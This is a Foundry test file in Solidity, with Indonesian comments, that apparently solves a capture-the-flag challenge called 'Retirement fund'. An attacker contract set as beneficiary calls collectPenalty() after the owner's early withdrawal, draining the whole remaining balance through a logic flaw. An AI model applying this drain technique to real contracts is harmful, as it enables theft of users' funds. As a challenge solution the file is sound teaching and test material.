// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {RetirementFund} from "src/RetirementFund.sol";

// #8 Retirement fund — owner (deployer) withdraw lebih awal: 90% keluar,
// 10% tertinggal. collectPenalty() beneficiary mengirim SELURUH sisa
// saldo (bukan 10% penalti) ke beneficiary bila withdrawn > 0.
// Owner + beneficiary berkolusi -> dana 0.
contract RetirementFundAttacker {
    function collect(RetirementFund target) external {
        target.collectPenalty();
    }

    receive() external payable {}
}

contract RetirementFundSolve is Test {
    RetirementFund challenge;
    RetirementFundAttacker attacker;

    function setUp() public {
        vm.deal(address(this), 10 ether);
        attacker = new RetirementFundAttacker();
        // deploy dengan beneficiary = attacker; test contract = owner
        challenge = new RetirementFund{value: 1 ether}(address(attacker));
    }

    function testInit() public view {
        assertFalse(challenge.isComplete());
    }

    function testSolve() public {
        // owner (test contract) tarik lebih awal: 0,9 ether keluar
        challenge.withdraw();
        assertEq(address(challenge).balance, 0.1 ether);
        // beneficiary klaim "penalti" = seluruh sisa 0,1 ether
        attacker.collect(challenge);
        assertTrue(challenge.isComplete());
    }

    receive() external payable {}
}
